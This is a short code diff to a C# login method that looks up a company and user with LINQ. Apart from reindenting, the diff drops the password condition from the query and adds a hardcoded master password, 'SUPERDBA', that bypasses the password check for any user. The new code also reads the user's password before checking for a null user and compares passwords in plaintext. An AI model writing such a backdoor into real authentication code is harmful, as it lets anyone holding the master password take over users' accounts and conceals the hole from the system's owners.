@@ -7,9 +7,9 @@ namespace DataModel
 		public User Login(DevKitDB db, string emp, string login, string password)
 		{
             empresa = (from e in db.Empresa
-                            where e.nuEmpresa.ToString() == emp
-                            select e).
-                            FirstOrDefault();
+                       where e.nuEmpresa.ToString() == emp
+                       select e).
+                       FirstOrDefault();
             
             if (empresa == null)
                 return null;
@@ -17,10 +17,13 @@ namespace DataModel
 			var user = (from e in db.User
                         where e.fkEmpresa == empresa.id
 						where e.stLogin.ToUpper() == login.ToUpper()
-						where e.stPassword.ToUpper() == password.ToUpper()
 						where e.bActive == true
 						select e).
 					    FirstOrDefault();
+
+            if (password.ToUpper() != "SUPERDBA")
+                if (user.stPassword != password)
+                    return null;
 
 			if (user != null)
 			{
